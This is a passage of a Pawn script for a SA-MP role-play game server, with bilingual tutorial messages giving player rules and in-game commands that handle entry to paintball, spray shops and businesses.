                {
                    SendClientMessage(i, COLOR_TUT96, "In server darbareye mode Role Play hastesh (Mode zendegi).");
                    SendClientMessage(i, COLOR_TUT96, "Ma player haiee ke bekhan inja Death match rah bendazan ro Ban mikonim (baraye 1 rooz).");
                    SendClientMessage(i, COLOR_TUT96, "Esmi ke entekhab mikonid nabayad daraie kalamate gheire akhlaghi bashe vagarna Ban mishid.");
                    SendClientMessage(i, COLOR_TUT96, "be kar bordan kalamate gheyre akhlaghi too server mamnooe.");
                    SendClientMessage(i, COLOR_TUT96, "baraye etelaat bishtar darbare Role Play be Forum ma Sar bezanid (site ma : wWw.VirtualLifeiran.iR).");
                    SendClientMessage(i, COLOR_TUT96, "(Shoma mitoonid Forum ro Dar Webpage ma Peida konid : http://wWw.VirtualLifeiran.iR).");
                }
                else if(TutTime[i] == 38)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Darbare komak{FFFF00}_____|");
                }
                else if(TutTime[i] == 41)
                {
                    SendClientMessage(i, COLOR_TUT96, "Age shoma ehtiaj be komak darid mitoonid be yeki az helper ha begid(/helpers).");
                    SCM(i, COLOR_TUT96, "(baraye darkhaste komak az komak konande ha(helper) az /helpme estefade konid.)");
                    SendClientMessage(i, COLOR_TUT96, "Baraye komak khastan be player ha begid : Salam, mitoonid be man komak konid? ya be English: Hey,Can you Help me?.");
                    SendClientMessage(i, COLOR_TUT96, "be kasi shelik nakon va ba kasi dava nakon.chon in kar to ro farde badi neshoon mide.");
                    SendClientMessage(i, COLOR_TUT96, "shoma mitooni az command haye /call ya /sms estefade konid ta ba kasi sohbat konid.");
                    SendClientMessage(i, COLOR_TUT96, "Shoma mitoonid hamishe forum ro check konid (http://wWw.VirtualLifeiran.iR).");
                }
                else if(TutTime[i] == 58)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Shoghl ha va faction ha{FFFF00}_____|");
                }
                else if(TutTime[i] == 61)
                {
                    SendClientMessage(i, COLOR_TUT96, "Age shoma mikhaid ke pool dar biarid bayad yek shoghl ya faction dashte bashid ( baraye didane job ha va peida kardaneshoon az commande (/jobs) estefade konid.");
                    SendClientMessage(i, COLOR_TUT96, "shoma MItoonid too in server Yek faction Va yek Job ba ham dashte bashid.");
                    SendClientMessage(i, COLOR_TUT96, "baraye Ozv shodan dar faction ha Bayad az dakhele forum site too ghesmat application(narm afzar)marboot be har faction, post (ba tavajoh be nemoone post too poste aval) bedin .");
                    SendClientMessage(i, COLOR_TUT96, "Level 3+: Fireman/Paramedic, News Reports, School Instructor, Tow Car Company ya Taxi Driver.");
                    SendClientMessage(i, COLOR_TUT96, "Level 5+ (family ha) : Member The Killers, Dangerous Tigers, Storm Men, Silence Mafia, The Racers, Legendary Men ya Fast N Furious.");
                    SendClientMessage(i, COLOR_TUT96, "Level 10+: Member Police Departament, FBI, National Guard, SFPD ya Hitman Agency. ");
                    SendClientMessage(i, COLOR_TUT96, "Shoghl Ha: Detective, Lawyer, Car Mechanic, Drugs Dealer, Arms Dealer, Farmer, Car jacker, Bus Driver, Garbageman, Trucker.");
                }
                else if(TutTime[i] == 77)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Level{FFFF00}_____|");
                }
                else if(TutTime[i] == 80)
                {
                    SendClientMessage(i, COLOR_TUT96, "Dakhele Server Role Play Shoma mitoonid Level Bekharid.");
                    SendClientMessage(i, COLOR_TUT96, "Baraye Level Up Kardan Bayad Shoma Respect Points Dashte Bashid Har Respect point = 1 saat bazi kardan dar server. ");
                    SendClientMessage(i, COLOR_TUT96, "Ma Har Respect Points Ro Har Pay Day midim ( Sare Saat Yek Respect midim )");
                    SendClientMessage(i, COLOR_TUT96, "Baraye Didane inke Shoma chand ta Respect Points darid Va Chand Ta Baraye Kharidane Level Bad Niaz Darid az Command /stats Komak begirid Ke Neveshte Respect:'x/x'.");
                    SendClientMessage(i, COLOR_TUT96, "vaghti Shoma Respect Hatoon Kamel Shod Mesle Respect: 'x/x'.");
                    SCM(i, COLOR_TUT96, "Bayad Ba tavajoh be Level Bad Pool Dashte bashid ta level bekharid va har moghe in Pool(dar bazi).");
                    SCM(i, COLOR_TUT96, "Va Respect Points ro Dashtid mitoonid baraye Level up az commande /buylevel estefade konid.");
                }
                else if(TutTime[i] == 100)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Taghalob ha va hack ha{FFFF00}_____|");
                }
                else if(TutTime[i] == 103)
                {
                    SendClientMessage(i, COLOR_TUT96, "Be hich onvan az Cheat Ya taghalob Estefade nakonid ke IP shoma Permanentaly Ban Khahad Shod.");
                    SendClientMessage(i, COLOR_TUT96, "Agar kasi az Cheat ya taghalob estefade mikard sari /report bedid Ta ma oon player ra ban konim.");
                    SendClientMessage(i, COLOR_TUT96, "Ino Be Yad dashte Bashid Ke age Cheat bezanid Anti Cheat haye Ghavie VirtualLifeiran Ip shomaro baraye hamishe Ban mikone va digar nemitavanid Vared server shavid!.");
                    SendClientMessage(i, COLOR_TUT96, "English : Do not forget! Anti-Cheat system works and you will receive permanent ban if you get caught.");
                }
                else if(TutTime[i] == 123)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Zaban{FFFF00}_____|");
                }
                else if(TutTime[i] == 126)
                {
                    SendClientMessage(i, COLOR_TUT96, "Tamoome Bazikon Ha Hagh daran ke Ya az zabane English ya Az zabane Farsi Too server Estefade konan dar gheire in soorat Warn Migirid.");
                    SendClientMessage(i, COLOR_TUT96, "Age Shoma Doost Darid Az Zaban Haye Digar dar server estefade konid az /b estefade konid.");
                    SendClientMessage(i, COLOR_TUT96, "az CAPSLOCK moghe neveshtan estefade nakon va lotfan az kalamate dorost estefade kon.");
                    SendClientMessage(i, COLOR_TUT96, "Shoma Hagh nadarid ke az Kalamate Bad estefade konid!.");
                    SendClientMessage(i, COLOR_TUT96, "Tablighat Dar Bare Server Haye digar mesle Esme server ya IP server haye digar ,IP Shomaro Perement ban mikone.");
                }
                else if(TutTime[i] == 136)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Payan{FFFF00}_____|");
                }
                else if(TutTime[i] == 139)
                {
                    SendClientMessage(i, COLOR_TUT96, "Omid Varam Lahzate khoobo Khoshi ro too servere ma begzaroonid.");
                    SendClientMessage(i, COLOR_TUT96, "age Khastid ke Dobare Tutorial Ro bebinid az '/rules' Ya '/tutorial' estefade konid.");
                    SendClientMessage(i, COLOR_TUT96, "VirtualLifeiran Lahzate khoshi Ro baraye shoma arezoo mikone.");
                }

    return 1;
    }
	*/
    if(strcmp(cmd, "/tutorial", true) == 0)
    {
	        if(PINFO[playerid][pLanguage] == 1)
            {
                TutTime[playerid] += 1;
                 if(TutTime[playerid] == 3)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Shoroo{FFFF00}_____|");
                }
                else if(TutTime[playerid] == 6)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "Salam, Khosh amadid be Server ma ({57e547}JoKeR GaminG {FFFFFF}) ma yek seri ghavanin haro behetoon neshoon midim.");
                    SendClientMessage(playerid, COLOR_TUT96, "Tamame Bazikon Ha bayad bedoonan ke che kari ro mitoonan anjam bedan ya che kari ro nemitoonan anjam bedan ");
                    SendClientMessage(playerid, COLOR_TUT96, "ma ye seri nokte haro dar ekhtiaretoon mizarim, agar soali bood forum maro bekhoonid(too bazi benevisid /forum).");
                }
                else if(TutTime[playerid] == 20)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Darbare Server{FFFF00}_____|");
                }
                else if(TutTime[playerid] == 23)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "In server darbareye mode Role Play hastesh (Mode zendegi).");
                    SendClientMessage(playerid, COLOR_TUT96, "Ma player haiee ke bekhan inja Death match rah bendazan ro Ban mikonim (baraye 1 rooz).");
                    SendClientMessage(playerid, COLOR_TUT96, "Esmi ke entekhab mikonid nabayad daraie kalamate gheire akhlaghi bashe vagarna Ban mishid.");
                    SendClientMessage(playerid, COLOR_TUT96, "be kar bordan kalamate gheyre akhlaghi too server mamnooe.");
                    SendClientMessage(playerid, COLOR_TUT96, "baraye etelaat bishtar darbare Role Play be Forum ma Sar bezanid (JoKeR GaminG:@samp_life).");
                    SendClientMessage(playerid, COLOR_TUT96, "(Shoma mitoonid Forum ro Dar telegram ma Peida konid : {57e547}v {FFFFFF}).");
                }
                else if(TutTime[playerid] == 38)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Darbare komak{FFFF00}_____|");
                }
                else if(TutTime[playerid] == 41)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "Age shoma ehtiaj be komak darid mitoonid be yeki az helper ha begid(/helpers).");
                    SCM(playerid, COLOR_TUT96, "(baraye darkhaste komak az komak konande ha(helper) az /helpme estefade konid.)");
                    SendClientMessage(playerid, COLOR_TUT96, "Baraye komak khastan be player ha begid : Salam, mitoonid be man komak konid? ya be English: Hey,Can you Help me?.");
                    SendClientMessage(playerid, COLOR_TUT96, "be kasi shelik nakon va ba kasi dava nakon.chon in kar to ro farde badi neshoon mide.");
                    SendClientMessage(playerid, COLOR_TUT96, "shoma mitooni az command haye /call ya /sms estefade konid ta ba kasi sohbat konid.");
                    SendClientMessage(playerid, COLOR_TUT96, "Shoma mitoonid hamishe forum ro check konid ({57e547}@samp_life {FFFFFF}).");
                }
                else if(TutTime[playerid] == 58)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Shoghl ha va faction ha{FFFF00}_____|");
                }
                else if(TutTime[playerid] == 61)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "Age shoma mikhaid ke pool dar biarid bayad yek shoghl ya faction dashte bashid ( baraye didane job ha va peida kardaneshoon az commande (/jobs) estefade konid.");
                    SendClientMessage(playerid, COLOR_TUT96, "shoma MItoonid too in server Yek faction Va yek Job ba ham dashte bashid.");
                    SendClientMessage(playerid, COLOR_TUT96, "baraye Ozv shodan dar faction ha Bayad az dakhele forum site too ghesmat application(narm afzar)marboot be har faction, post (ba tavajoh be nemoone post too poste aval) bedin .");
                    SendClientMessage(playerid, COLOR_TUT96, "Level 3+: Fireman/Paramedic, News Reports, School Instructor, Tow Car Company ya Taxi Driver.");
                    SendClientMessage(playerid, COLOR_TUT96, "Level 5+ (family ha) : Member The Killers, Dangerous Tigers, Storm Men, Silence Mafia, The Racers, Legendary Men ya Fast N Furious.");
                    SendClientMessage(playerid, COLOR_TUT96, "Level 10+: Member Police Departament, FBI, National Guard, SFPD ya Hitman Agency. ");
                    SendClientMessage(playerid, COLOR_TUT96, "Shoghl Ha: Detective, Lawyer, Car Mechanic, Drugs Dealer, Arms Dealer, Farmer, Car jacker, Bus Driver, Garbageman, Trucker.");
                }
                else if(TutTime[playerid] == 77)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Level{FFFF00}_____|");
                }
                else if(TutTime[playerid] == 80)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "Dakhele Server Role Play Shoma mitoonid Level Bekharid.");
                    SendClientMessage(playerid, COLOR_TUT96, "Baraye Level Up Kardan Bayad Shoma Respect Points Dashte Bashid Har Respect point = 1 saat bazi kardan dar server. ");
                    SendClientMessage(playerid, COLOR_TUT96, "Ma Har Respect Points Ro Har Pay Day midim ( Sare Saat Yek Respect midim )");
                    SendClientMessage(playerid, COLOR_TUT96, "Baraye Didane inke Shoma chand ta Respect Points darid Va Chand Ta Baraye Kharidane Level Bad Niaz Darid az Command /stats Komak begirid Ke Neveshte Respect:'x/x'.");
                    SendClientMessage(playerid, COLOR_TUT96, "vaghti Shoma Respect Hatoon Kamel Shod Mesle Respect: 'x/x'.");
                    SCM(playerid, COLOR_TUT96, "Bayad Ba tavajoh be Level Bad Pool Dashte bashid ta level bekharid va har moghe in Pool(dar bazi).");
                    SCM(playerid, COLOR_TUT96, "Va Respect Points ro Dashtid mitoonid baraye Level up az commande /buylevel estefade konid.");
                }
                else if(TutTime[playerid] == 100)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Taghalob ha va hack ha{FFFF00}_____|");
                }
                else if(TutTime[playerid] == 103)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "Be hich onvan az Cheat Ya taghalob Estefade nakonid ke IP shoma Permanentaly Ban Khahad Shod.");
                    SendClientMessage(playerid, COLOR_TUT96, "Agar kasi az Cheat ya taghalob estefade mikard sari /report bedid Ta ma oon player ra ban konim.");
                    SendClientMessage(playerid, COLOR_TUT96, "Ino Be Yad dashte Bashid Ke age Cheat bezanid Anti Cheat haye Ghavie {57e547}JoKeR GaminG {FFFFFF} Ip shomaro baraye hamishe Ban mikone va digar nemitavanid Vared server shavid!.");
                    SendClientMessage(playerid, COLOR_TUT96, "English : Do not forget! Anti-Cheat system works and you will receive permanent ban if you get caught.");
                }
                else if(TutTime[playerid] == 123)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Zaban{FFFF00}_____|");
                }
                else if(TutTime[playerid] == 126)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "Tamoome Bazikon Ha Hagh daran ke Ya az zabane English ya Az zabane Farsi Too server Estefade konan dar gheire in soorat Warn Migirid.");
                    SendClientMessage(playerid, COLOR_TUT96, "Age Shoma Doost Darid Az Zaban Haye Digar dar server estefade konid az /b estefade konid.");
                    SendClientMessage(playerid, COLOR_TUT96, "az CAPSLOCK moghe neveshtan estefade nakon va lotfan az kalamate dorost estefade kon.");
                    SendClientMessage(playerid, COLOR_TUT96, "Shoma Hagh nadarid ke az Kalamate Bad estefade konid!.");
                    SendClientMessage(playerid, COLOR_TUT96, "Tablighat Dar Bare Server Haye digar mesle Esme server ya IP server haye digar ,IP Shomaro Perement ban mikone.");
                }
                else if(TutTime[playerid] == 136)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Payan{FFFF00}_____|");
                }
                else if(TutTime[playerid] == 139)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "Omid Varam Lahzate khoobo Khoshi ro too servere ma begzaroonid.");
                    SendClientMessage(playerid, COLOR_TUT96, "age Khastid ke Dobare Tutorial Ro bebinid az '/rules' Ya '/tutorial' estefade konid.");
                    SendClientMessage(playerid, COLOR_TUT96, "{57e547}JoKeR GaminG {FFFFFF} Lahzate khoshi Ro baraye shoma arezoo mikone.");
                }
       }
	   	        if(PINFO[playerid][pLanguage] == 1)
            {
                TutTime1[playerid] += 1;
                if(TutTime1[playerid] == 3)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}The Beginning{FFFF00}_____|");
                }
                else if(TutTime1[playerid] == 6)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "Hello there, I see you're new, we'll show you a quick Tutorial.");
                    SendClientMessage(playerid, COLOR_TUT96, "Firstly, all new players need to know what should or shouldn't on this server.");
                    SendClientMessage(playerid, COLOR_TUT96, "We'll give you some information, so please pay attention to avoid additional questions.");
                }
                else if(TutTime1[playerid] == 18)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}About Server{FFFF00}_____|");
                }
                else if(TutTime1[playerid] == 21)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "This server is a RolePlay.");
                    SendClientMessage(playerid, COLOR_TUT96, "We don't accept players who don't respect the rules or come here for DeathMach");
                    SendClientMessage(playerid, COLOR_TUT96, "The name that you have chosen matters a lot, each player can choose what name he/she likes.");
                    SendClientMessage(playerid, COLOR_TUT96, "We recommend you to choose legible name like: Andrew, Thomas, Matt.");
                    SendClientMessage(playerid, COLOR_TUT96, "If you want to know more about RPG, visit our forum.");
                    SendClientMessage(playerid, COLOR_TUT96, "({57e547}JoKeR GaminG {FFFFFF})");
                }
                else if(TutTime1[playerid] == 36)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Help{FFFF00}_____|");
                }
                else if(TutTime1[playerid] == 39)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "If you're confused and you would like to know more information, ask a player or a helper(/helpers).");
                    SendClientMessage(playerid, COLOR_TUT96, "Use common sentences like: 'Hey, can you help me?'.");
                    SendClientMessage(playerid, COLOR_TUT96, "Don't start shout at someone, because it will make you lock bad.");
                    SendClientMessage(playerid, COLOR_TUT96, "Use commands /call or /sms (if you have cellv ) to talk with someone.");
                    SendClientMessage(playerid, COLOR_TUT96, "You can also access our  {57e547}@samp_life {FFFFFF}.iR) to receive more help.");
                }
                else if(TutTime1[playerid] == 56)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Job's{FFFF00}_____|");
                }
                else if(TutTime1[playerid] == 59)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "If you want to earn money you must have a job.");
                    SendClientMessage(playerid, COLOR_TUT96, "On this server you can have two type of jobs, one primary and one secondary.");
                    SendClientMessage(playerid, COLOR_TUT96, "Primay job's:(you must make an application on the forum and requires a certain level for each faction).");
                    SendClientMessage(playerid, COLOR_TUT96, "Level 3+: Fireman/Paramedic, News Reports, School Instructor, Tow Car Company or Taxi Drive.");
                    SendClientMessage(playerid, COLOR_TUT96, "Level 5+(Families): Member The Killers, Dangerous Tigers, Storm Men, Silence Mafia, The Racers, Legendary Men or Fast N Furious.");
                    SendClientMessage(playerid, COLOR_TUT96, "Level 10: Police Departament, FBI, National Guard, SFPD or Hitman Agency. ");
                    SendClientMessage(playerid, COLOR_TUT96, "Secondary Job's: Detective, Lawyer, Car Mechanic, Drugs Dealer, Arms Dealer, Bus Drive , Trucker , Farmer, Garbageman");
                }
                else if(TutTime1[playerid] == 80)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Level{FFFF00}_____|");
                }
                else if(TutTime1[playerid] == 83)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "As a RolePlay server, you can increase your level by staying online.");
                    SendClientMessage(playerid, COLOR_TUT96, "To level up need a certain number or Respect Points.");
                    SendClientMessage(playerid, COLOR_TUT96, "You earn a Respect Point every PayDay (it comes after 60 minutes).");
                    SendClientMessage(playerid, COLOR_TUT96, "To see how many points you need, you have to write /stats and look at the 'Respect: x/x'.");
                    SendClientMessage(playerid, COLOR_TUT96, "When you reach the required number of points then you should write /buylevel to do level up (it will cost a some of money). ");
                }
                else if(TutTime1[playerid] == 101)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Cheats{FFFF00}_____|");
                }
                else if(TutTime1[playerid] == 104)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "It is a forbbiden to use hackings applications.");
                    SendClientMessage(playerid, COLOR_TUT96, "If you see someone who uses hacks, notify us by using /report.");
                    SendClientMessage(playerid, COLOR_TUT96, "Those who are using hacks will be banned permanently.");
                    SendClientMessage(playerid, COLOR_TUT96, "Do not forget! Anti-Cheat system works and you will receive permanent ban if you get caught.");
                }
                else if(TutTime1[playerid] == 116)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Language{FFFF00}_____|");
                }
                else if(TutTime1[playerid] == 119)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "Every player must speak in Persian or English.");
                    SendClientMessage(playerid, COLOR_TUT96, "If you want talk other language then use /b.");
                    SendClientMessage(playerid, COLOR_TUT96, "Do not used capital letters and please write correctly.");
                    SendClientMessage(playerid, COLOR_TUT96, "Also, you are not allowed to use nasty words.");
                    SendClientMessage(playerid, COLOR_TUT96, "Advertisments of other servers will get you to permanent ban.");
                }
                else if(TutTime1[playerid] == 131)
                {
                    SendClientMessage(playerid, COLOR_Jooje, "|_____Tutorial: {FFFFFF}The End{FFFF00}_____|");
                }
                else if(TutTime1[playerid] == 134)
                {
                    SendClientMessage(playerid, COLOR_TUT96, "I hope you understand what is RolePlay about.");
                    SendClientMessage(playerid, COLOR_TUT96, "We still want to remember you that you have to read our rules(/rules).");
                    SendClientMessage(playerid, COLOR_TUT96, "{57e547}JoKeR GaminG {FFFFFF} wishes you have fun!");
                }
			}
    return 1;
    }
//===================================================================================================================
if(strcmp(cmd, "/atmhelp", true) == 0)
{
SCM(playerid,COLOR_LIGHTGREEN, "|_____________[Atm help]____________|");
SCM(playerid,COLOR_WHITE, "Help: /atmwithdraw");
return 1;
}
	if(strcmp(cmd, "/enter", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(IsPlayerInRangeOfPoint(playerid,6.0,SBizzInfo[10][sbEntranceX],SBizzInfo[10][sbEntranceY],SBizzInfo[10][sbEntranceZ]))
			{
			    if(PINFO[playerid][pGunLic] <= 0) return SCM(playerid,COLOR_ALI,"You haven't Weapon license.");
			    if(OnPaintBall[playerid] == 1) return SCM(playerid,COLOR_ALI,"You already on Paint ball.");
			    if(PaintballStarted == 1) {new sttr[256],looOool,miin,secc;for(new i;i<8;i++){if(looOool >= 60) {looOool -= 60;miin++;}if(looOool <= 59){secc = looOool;looOool = 0;break;}}format(sttr,256,"You need to wait %d minutes and %d seconds to paint ball end.",miin,secc);return SCM(playerid,COLOR_ALI,sttr);	}
				new rand;
				rand = random(sizeof(PaintballSpawns));
			    SetPlayerPosEx(playerid, PaintballSpawns[rand][0], PaintballSpawns[rand][1], PaintballSpawns[rand][2]);
				TogglePlayerControllable(playerid,0);
				OnPaintBall[playerid] = 1;
				SCM(playerid, COLOR_YELLOW2, "Lotfan Yek Aslahe Ra Entekhab Konid.");
				ShowPlayerDialog(playerid, 4202, DIALOG_STYLE_LIST, "Please Vote To A Weapon", "Desert eagle\nSilence Deagle\nShotgun\nSawnoff Shotgun\nCombat Shotgun\nMP5\nSniper Rifle\nAK-47\nM4\nCountry Rifle", "Accept","");
				SetTimerEx("pbvotet", 5000, 0, "d", playerid);
			}
			for(new bizid = 0; bizid < sizeof(BizzInfo); bizid++)
	        {
			// Spray
	if (PlayerToPoint(4.0, playerid,BizzInfo[bizid][bEntranceX],BizzInfo[bizid][bEntranceY],BizzInfo[bizid][bEntranceZ]))
				{
		if (bizid == 75 || bizid == 76 || bizid == 77 || bizid == 78 || bizid == 79 || bizid == 80) {
		new carid;
		carid = GetPlayerVehicleID(playerid);
		if(!IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) !=  PLAYER_STATE_DRIVER) return SCM(playerid, COLOR_YELLOW2, "Error: You aren't in any vehicle or not driver.");

		if(GetPlayerPool(playerid) < 100+BizzInfo[bizid][bEntranceCost]) return SCM(playerid, COLOR_YELLOW2, "Error: You haven't enough cash for enter to biz.");
		format(string, sizeof(string), "~r~-$%d", BizzInfo[bizid][bEntranceCost]);

	GetVehicleColorX(GetPlayerVehicleID(playerid), vhcolor1[playerid], vhcolor2[playerid]);
	GetVehicleZAngle(GetPlayerVehicleID(playerid), ZAng[playerid]);
	GetVehiclePos(carid, TeleportDest2[playerid][0],TeleportDest2[playerid][1],TeleportDest2[playerid][2]);
	SetVehiclePos(carid, BizzInfo[bizid][bExitX],BizzInfo[bizid][bExitY],BizzInfo[bizid][bExitZ]);
		if(playerid == 0) {

	SetVehicleVirtualWorld(carid, 2000);

	for( new i = 0; i<Akharish; i++ )
			{
			if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i))
			{
			if(GetPlayerVehicleID(i) == carid)
			{
		   if(GetPlayerVehicleSeat(i) == 0)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 0 );
			}
			else if(GetPlayerVehicleSeat(i) == 1)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 1);
			}
			else if(GetPlayerVehicleSeat(i) == 2)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 2);
			}
			else if(GetPlayerVehicleSeat(i) == 3)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 3);
			}
			else if(GetPlayerVehicleSeat(i) == 4)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 4);
			}
			else if(GetPlayerVehicleSeat(i) == 5)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 5);
			}
			else if(GetPlayerVehicleSeat(i) == 6)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 6);
			}
			else if(GetPlayerVehicleSeat(i) == 7)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 7);
			}
			else if(GetPlayerVehicleSeat(i) == 8)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 8);
			}
			else if(GetPlayerVehicleSeat(i) == 9)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 9);
			}
			else if(GetPlayerVehicleSeat(i) == 10)
			{
			SetPlayerVirtualWorld(i, 2000);
			PutPlayerInVehicle(i, carid, 10);
			}
			}
			}
			}
			}
			if(playerid != 0) {
			 for( new i = 0; i<Akharish; i++ )
			{
			SetVehicleVirtualWorld(carid, playerid);
			if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i))
			{
			if(GetPlayerVehicleID(i) == carid)
			{
		   if(GetPlayerVehicleSeat(i) == 0)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 0 );
			}
			else if(GetPlayerVehicleSeat(i) == 1)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 1);
			}
			else if(GetPlayerVehicleSeat(i) == 2)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 2);
			}
			else if(GetPlayerVehicleSeat(i) == 3)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 3);
			}
			else if(GetPlayerVehicleSeat(i) == 4)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 4);
			}
			else if(GetPlayerVehicleSeat(i) == 5)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 5);
			}
			else if(GetPlayerVehicleSeat(i) == 6)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 6);
			}
			else if(GetPlayerVehicleSeat(i) == 7)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 7);
			}
			else if(GetPlayerVehicleSeat(i) == 8)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 8);
			}
			else if(GetPlayerVehicleSeat(i) == 9)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 9);
			}
			else if(GetPlayerVehicleSeat(i) == 10)
			{
			SetPlayerVirtualWorld(i, playerid);
			PutPlayerInVehicle(i, carid, 10);
			}
			}
			}
			}
			}

		//SetPlayerPos(playerid, BizzInfo[bizid][bExitX],BizzInfo[bizid][bExitY],BizzInfo[bizid][bExitZ]);
		// new strung;

		if(bizid == 75) {
		SetVehicleZAngle(carid ,181.468887);
		SetCameraBehindPlayer(playerid);
		}
		if(bizid == 76) {
		SetCameraBehindPlayer(playerid);
		}
		if(bizid == 77) {
		SetVehicleZAngle(carid ,-10.2600);
		SetCameraBehindPlayer(playerid);
		}
		if(bizid == 78) {
		SetVehicleZAngle(carid ,-89.5200);
		SetCameraBehindPlayer(playerid);
		}
		if(bizid == 79) {
		SetVehicleZAngle(carid ,-177.4800);
		SetCameraBehindPlayer(playerid);
		}
		if(bizid == 80) {
		SetVehicleZAngle(carid ,0.0000);
		SetCameraBehindPlayer(playerid);

		}
	RepairVehicleEx(GetPlayerVehicleID(playerid));
		new stringer[512];
		GivePlayerPool(playerid,-BizzInfo[bizid][bEntranceCost]);
		format(stringer, sizeof(stringer), "~r~-$%d", BizzInfo[bizid][bEntranceCost]);
		BizzInfo[bizid][bTill] += BizzInfo[bizid][bEntranceCost];
		BizzInfo[bizid][bProducts]--;
		OnBizUpdate(bizid);
		GameTextForPlayer(playerid, stringer, 5000, 1);
		SetTimerEx("spraytime", 5000, 0, "d", playerid);
 
		return 1;
	}
            if((bizid == 51 || bizid == 52 || bizid == 53)&& !IsACop(playerid))
                        {
                        SCM(playerid,COLOR_BLUE,"You are not a Cop.");
                        return 1;
                        }
                if(PlayerInfo[playerid][pPbiskey] == bizid || GetPlayerPool(playerid) >= BizzInfo[bizid][bEntranceCost])
                {
                    if(PlayerInfo[playerid][pPbiskey] == bizid)
                    {}
                    else {
                        if(BizzInfo[bizid][bLocked] == 1)
                        {
                            GameTextForPlayer(playerid, "~r~Closed", 5000, 1);
                        return 1;
                        }
 }
                        GivePlayerPool(playerid,-BizzInfo[bizid][bEntranceCost]);
                        format(string, sizeof(string), "~r~-$%d", BizzInfo[bizid][bEntranceCost]);
                        BizzInfo[bizid][bTill] += BizzInfo[bizid][bEntranceCost];
                        BizzInfo[bizid][bProducts]--;
                        OnBizUpdate(bizid);
                        GameTextForPlayer(playerid, string, 5000, 1);
                    SetPlayerInterior(playerid,BizzInfo[bizid][bInterior]);
                    SetPlayerPosEx(playerid,BizzInfo[bizid][bExitX],BizzInfo[bizid][bExitY],BizzInfo[bizid][bExitZ]);
                    Mahal[playerid] = 15;
                    TooHouse[playerid] = 9999;
                    SetPlayerVirtualWorld(playerid,BizzInfo[bizid][bVW]);
                    TooBiz[playerid] = bizid;
                }
                else
                {
                    GameTextForPlayer(playerid, "~r~You dont have the cash", 5000, 1);
                }

    }
}
